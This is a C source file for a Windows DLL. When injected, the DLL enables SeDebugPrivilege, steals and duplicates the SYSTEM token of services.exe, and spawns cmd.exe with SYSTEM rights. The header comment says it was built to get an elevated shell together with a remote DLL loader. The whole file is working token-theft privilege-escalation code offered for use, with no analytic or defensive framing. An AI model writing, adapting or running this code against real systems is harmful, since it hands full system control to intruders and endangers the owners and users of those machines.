#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h> // For process snapshot and enumeration
#include <string.h> // For _stricmp (though we now use wcsicmp)
#include <wchar.h>  // For wide-character string functions

/*
 * This DLL attempts to enable the SeDebugPrivilege to steal the token
 * handle from a privileged process (services.exe), duplicate it and
 * starte a new, privileged process with the token. 
 *
 * This was created as a means to establish an elevated cmd.exe process,
 * any *.exe will work (ex, powershell.exe). It can be used with the
 * remote_dll_loader.c program.
*/

// Function prototypes
BOOL EnablePrivilege(LPCSTR lpszPrivilege);
DWORD FindProcessId(LPCSTR processName);

// --- The core DLL logic executed upon loading ---
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);

        HANDLE hToken = NULL;
        HANDLE hProcess = NULL;
        HANDLE hNewToken = NULL;
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        DWORD dwProcessId;

        printf("--- PrivEsc DLL Loaded ---\n");

        // 1. Enable SeDebugPrivilege
        // This MUST succeed for the subsequent OpenProcess call to work on SYSTEM processes.
        if (!EnablePrivilege(SE_DEBUG_NAME)) {
            printf("[-] Failed to enable SeDebugPrivilege. Error: %lu\n", GetLastError());
            printf(">>> Ensure the process running the loader is elevated (Run as Administrator).\n");
            return FALSE;
        }
        printf("[+] SeDebugPrivilege enabled successfully.\n");
        

        // 2. Find a target process running as SYSTEM (services.exe)
        LPCSTR targetProcess = "services.exe";
        dwProcessId = FindProcessId(targetProcess);

        if (dwProcessId == 0) {
            printf("[-] Target process %s not found.\n", targetProcess);
            return FALSE;
        }
        printf("[+] Found %s with PID: %lu\n", targetProcess, dwProcessId);

        // 3. Open the target process and its token
        // Request PROCESS_QUERY_INFORMATION to access its token
        hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcessId);
        
        if (hProcess == NULL) {
            // This is the point where Error 5 (Access Denied) was occurring.
            printf("[-] Failed to open target process. Error: %lu (Access Denied).\n", GetLastError());
            printf(">>> The most likely cause is still insufficient permissions despite the privilege attempt.\n");
            return FALSE;
        }

        if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
            printf("[-] Failed to open process token. Error: %lu\n", GetLastError());
            CloseHandle(hProcess);
            return FALSE;
        }

        // 4. Duplicate the token (Primary Token)
        if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, 
                              SecurityImpersonation, TokenPrimary, &hNewToken)) {
            printf("[-] Failed to duplicate token. Error: %lu\n", GetLastError());
            CloseHandle(hToken);
            CloseHandle(hProcess);
            return FALSE;
        }

        // 5. Execute a new process with the SYSTEM token
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));

        // Command to execute with elevated privileges
        // Note: L"C:\\..." is a Wide Character string literal.
        if (!CreateProcessWithTokenW(
            hNewToken, 
            LOGON_WITH_PROFILE, 
            L"C:\\Windows\\System32\\cmd.exe", 
            NULL, 
            0, 
            NULL, 
            NULL, 
            &si, 
            &pi)) 
        {
            printf("[-] Failed to launch process with duplicated token. Error: %lu\n", GetLastError());
        } else {
            printf("[***] SUCCESS: Launched process with SYSTEM token! Check for new command prompt.\n");
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }

        // 6. Cleanup
        if (hNewToken) CloseHandle(hNewToken);
        if (hToken) CloseHandle(hToken);
        if (hProcess) CloseHandle(hProcess);
    }
    return TRUE;
}


// --- Helper Functions ---

/**
 * @brief Attempts to enable a specified privilege for the current process.
 */
BOOL EnablePrivilege(LPCSTR lpszPrivilege) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return FALSE;
    }

    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
        CloseHandle(hToken);
        return FALSE;
    }

    // Check if the privilege was successfully adjusted (optional, but good practice)
    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}

/**
 * @brief Finds the first Process ID for a given process name using native Unicode.
 */
DWORD FindProcessId(LPCSTR processName) {
    HANDLE hSnapshot;
    PROCESSENTRY32W pe; // Use the Wide-character version
    DWORD dwProcessId = 0;
    
    // Convert the input target process name from ANSI (LPCSTR) to WideChar (LPCWSTR)
    wchar_t wProcessName[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, processName, -1, wProcessName, MAX_PATH);

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("Error: CreateToolhelp32Snapshot failed. Error: %lu\n", GetLastError());
        return 0;
    }

    pe.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(hSnapshot, &pe)) { // Use the Wide-character version: Process32FirstW
        do {
            // Compare the strings directly using case-insensitive wide-character compare
            if (_wcsicmp(pe.szExeFile, wProcessName) == 0) {
                dwProcessId = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe)); // Use Process32NextW
    }

    CloseHandle(hSnapshot);
    return dwProcessId;
}
